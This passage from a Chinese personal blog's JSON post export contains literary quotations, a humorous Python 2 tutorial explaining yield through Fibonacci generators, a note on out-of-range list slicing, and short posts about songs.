“世间有人爱我，有人憎我，有人说我对，有人说我错，如此，我当听哪一句？”“有某说你对，是因你所说之事合他心意。有某说你错，是因你所做之事与他所想相悖。说你对的许是你说了他不敢说的，承担了他不敢承担的，故而爱你，故而对你击节称赞，说穿了实在酸涩。说你错的许是你真的错了，因你之错太过明显，已暴露在诸人之中，而诸人皆是知道真相之人，他们不语，暗自看你笑话，那直接说你错的许是憎你，但你应谢他直言这一回。” 她用一双眼望着苍天，与它对视。 她说:“我幼小的时候，曾求你仁慈，后来长大了，便不再求你，因为我通晓了人事，知道求你也无用。求你只会让你嘲弄我、轻鄙我，求你只会让你知道我的弱点，知道我在乎什么。我的孩儿们小时候，我都曾拉着他们的小手，站在空旷的天地上，向你叩拜，我求你保佑他们好好长大，不要像我一样，我求你赐给他们快乐而勇敢的心，无论命运怎么捉弄都不会丧失希望。我所要的不多，并……不多啊。是啊，我输了，你赢了。我敌不过命运，我以人智，妄想换天。可是，那又如何？那又能怎样！” 先时我不信人间何物是长久的，亦总觉人与畜生无有不同，因人一生如此短暂，悟到什么，也只剩来不及。 “他是我的心上人，这才是他做对的唯一的一件事。你瞧他不过如此，可是在我眼中，他却是天地至美。而天地至美，本无常主。所以，他迟迟不属于我，也不属于任何一个人。” 你觉得活着费力，任凭谁也没好过多少。何苦生为人，人就是这样苦，你倘有本事，下辈子便托生为一块石头，那才妙。 我可能不曾告诉过你，我有一个哥哥，我那个哥哥死了。对，每个人都会死，他与别的人都一样，他也死了，他说他二十岁的时候，会送我嫁给这世上最好看的男子，可我等了三百年，却再也盼不到他二十岁了。但我想，我一定得达成他的愿望，我得嫁给这世上最好看的男子，我要我的夫君万世其昌，我要你好好的，好好的子孙满堂。 天下甚美。我还肯爱这山河，只是因为他还热切地爱着河山。 文中句子取自：《昭奚旧草》 摘抄：愿以百年挽朝夕","tags":[{"name":"音乐","slug":"音乐","permalink":"http://ev1l.cn/tags/音乐/"},{"name":"Leo","slug":"Leo","permalink":"http://ev1l.cn/tags/Leo/"}]},{"title":"你需要一个老头，帮助你理解下 Python 中的 yield","date":"2016-12-14T08:01:01.000Z","path":"2016/12/14/python_yield1/","text":"题外话 最初接触 Python 这门语言的时候，看的是《Python 核心编程》 迷迷糊糊的把 yield 这里看过去了，知道这个东西是用来造一个生成器用的，就一带而过了，日后的搬砖过程中也不知道怎么用这个家伙事儿。 我比较笨，学东西讨厌文档型说明（看不懂QAQ）。所以总是自己花很长时间去加工适合我的食物。 说起 yield，那这到底是个什么玩意？准备好了，我要开始背课文了：……从小脑袋不好使，记不住……还是编故事吧： 有个叫斐波那契的老头（也可能是女的，跟我有什么关系），提出了一个（不明白他搞出这东西要干啥的）数列定义（斐波那契数列）： 有一串数字，前两个是1，从第三个开始，每个数字都是它前两位数字的和。（1, 1, 2, 3, 5, 8, 13……） 提出定义的人我可以理解为他无聊，但是后来一群抠脚大汉开始对第N个数是多少那么感兴趣是什么鬼？这玩意算出来能干啥？（不知道） 不行，我也要凑热闹。（koujiao……） 123456def fab(max): n, a, b = 0, 0, 1 while n &lt; max: print b a, b = b, a + b n = n + 1 好，跑一下试试。123456&gt;&gt;&gt; fab(5)11235 结果是对的，你以为这就完了？隔壁王叔叔表示小伙子你这个写的有点问题啊，你这个直接print出来的，只能给我看，不能让我直接拿来用啊（你用它能干嘛？[手动黑人问号]）好，那就听您老的，给你返回一个 List 让你用（？？？）。12345678def fab(max): n, a, b = 0, 0, 1 list = [] while n &lt; max: list.append(b) a, b = b, a + b n = n + 1 return list 来，试一下。12345678&gt;&gt;&gt; for n in fab(5):... print n...11235 隔壁王叔叔的丈母娘（跟直系亲属姥姥不是一个人，谢谢)表示，小伙子你这个程序太特么占内存了，我输入大一点，这个List占用的内存都够我玩刺客信条大革命了（excuse me??)。 性能优化如果对python有一些了解的话，我们能很自然的想到一个经常拿来装逼的东西xrange。1234567# 1for i in range(1000): pass# 2for i in xrange(1000): pass 上面的两种写法，第一种是直接生成 1000个元素的List，相当于一次性给你一年的生活费。 而第二种是每次循环用到的时候给你一个，再用到再给你一个，可以理解为他有一个算式，每次你找他要钱他都要当场算算，然后给你一天的生活费。那用第二种方法吧。（看起来很扣的样子） 好，实现一个。12345678910111213141516class Fab(object): def __init__(self, max): self.max = max self.n, self.a, self.b = 0, 0, 1 def __iter__(self): return self def next(self): if self.n &lt; self.max: r = self.b self.a, self.b = self.b, self.a + self.b self.n = self.n + 1 return r raise StopIteration() 基础差的看不懂的，其实上面的代码就是定义了一个算法，你每次问我要一个数，我就当场算一个数，不会像上一个版本直接返回给你一个List。我们来调用一下：12345678&gt;&gt;&gt; for n in Fab(5):... print n...11235 嗯，成功了，这个版本性能是有了，可是隔壁王叔叔的侄女看了看代码不愿意了，帅哥（为什么要说出来？）你这个程序看着太复杂了啊，本来那么简单的代码怎么写的这么复杂啊？你这个人好复杂啊。 很好小姑娘，你要是王叔叔，我特么把你家网线煮了。看在你说的挺有道理的份上（其实是长得好看），我看看能不能简单点。 来，我们用一种高逼格的东西，兼顾简洁与性能，嘤嘤嘤。1234567def fab(max): n, a, b = 0, 0, 1 while n &lt; max: yield b # print b a, b = b, a + b n = n + 1 跟最初的第一个版本很像，注释掉了print b这句话，加上了 yield b。这里我们先调用下，看看结果。12345678&gt;&gt;&gt; for n in fab(5):... print n...11235 吹牛B模式已开启ok, 现在来回想下我们一路走过来，从最初的版本到使用yield之前，经历了哪些改动？仔细对照第一次的例子和这个使用yield的例子，好像差不多？再看看我们测试结果的代码有什么不同。就是这里了123456# 第一个例子fab(5)# yield例子for n in fab(5) print n 发现问题了吗？ fab(max) 函数中同样使用循环 一个使用 yield，另一个使用 print 打印 yield 例子，需要自己循环调用才能一个一个打印出来 这里我们推测yield使用上的特点： 暂停函数运行（要循环调用才管用） 再次调用能从上次暂停的地方继续执行函数（数列是连续的） 函数的每次运行都是遇到 yield 就停止并返回迭代值，下次再用时继续 对不起我编不下去了 据说还有更强大的使用方式，下次有机会研究研究写个续吧：） 隔壁王叔叔的儿子的小姨子表示小伙子，你再努努力，我就跟你跑了。 例子取自：廖雪峰-Python yield使用浅析","tags":[{"name":"python","slug":"python","permalink":"http://ev1l.cn/tags/python/"}]},{"title":"记python的一个坑","date":"2016-12-01T08:55:10.000Z","path":"2016/12/01/python_1/","text":"之前 python 的 server 出过一次问题，总是异常丢失数据。查日志也分析不出问题。 很困扰，最后一层一层找，发现是数据库返回的数据有重复列，到python端因为采用的是 index + data 分开存的方式（index: {name:1, age:2}, data:{‘zhangsan’, 23} 这样的两个集合），两个重复列名会导致index的对应出问题（字典无法存在两个相同 key）。我的问题是 index 的索引值超出了 data 的长度。 问题找到后，数据库端存储过程修改正确后这个奇怪的现象被我忽略了。后来今天看到了这么一段： 以下代码将输出什么?12list = ['a', 'b', 'c', 'd', 'e']print list[10:] 答案 以上代码将输出 []，并且不会导致一个 IndexError。 正如人们所期望的，试图访问一个超过列表索引值的成员将导致 IndexError（比如访问以上列表的 list[10]）。尽管如此，试图访问一个列表的以超出列表成员数作为开始索引的切片将不会导致 IndexError，并且将仅仅返回一个空列表。 一个讨厌的小问题是它会导致出现 bug ，并且这个问题是难以追踪的，因为它在运行时不会引发错误。 这原来是面试题里的送分题……这就尴尬了……","tags":[{"name":"python","slug":"python","permalink":"http://ev1l.cn/tags/python/"},{"name":"反人类","slug":"反人类","permalink":"http://ev1l.cn/tags/反人类/"}]},{"title":"分享一首歌","date":"2016-12-01T01:24:10.000Z","path":"2016/12/01/zyt/","text":"“是我先喜欢的你，所以你可以在我面前尽情的嚣张了。”“为什么要嚣张？” 你也许不会再出现在我的文字里了。其实你也有很久都没出现在我的文字里了：）","tags":[{"name":"音乐","slug":"音乐","permalink":"http://ev1l.cn/tags/音乐/"}]},{"title":"林宥嘉：她説好：)","date":"2016-11-29T15:56:00.000Z","path":"2016/11/29/林宥嘉：他説好：）/","text":"我不介意你慢动作我相信你正在与我相遇的路上马不停蹄所以当我拥抱整个世界的孤寂也像拥抱着你我不介意你慢动作也不介意这次先「擦肩而过」某天我们总会遇到对方然后说原来是你噢 -『致姗姗来迟的你』","tags":[{"name":"Leo","slug":"Leo","permalink":"http://ev1l.cn/tags/Leo/"}]}]